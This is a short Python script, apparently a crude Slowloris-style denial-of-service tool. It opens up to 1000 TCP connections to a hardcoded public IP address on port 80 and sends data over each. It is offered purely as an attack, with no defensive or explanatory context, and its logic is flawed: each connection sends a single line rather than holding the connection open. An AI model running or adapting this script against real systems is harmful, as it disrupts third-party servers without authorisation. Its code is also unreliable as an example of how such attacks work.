
import socket, _thread

class Loris():

    socket = None
    thread = None
    running = True

    def attack(self):
        while(self.running):
            self.socket.send("hello\n".encode("UTF-8"))
            self.running = False

    def __init__(self, rHost, rPort):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket.connect((rHost, rPort))
        except socket.error:
            self.running = False
            return
        self.thread = _thread.start_new_thread(self.attack, ())

def Main():
    lori = []

    for x in range(1000):
        loris = Loris("172.217.22.174", 80)
        if(not loris.running):
            print("Loris Could Not Connect Stopping Attack")
            break
        loris.attack()
        lori.append(loris)

if __name__ == "__main__":
    Main()
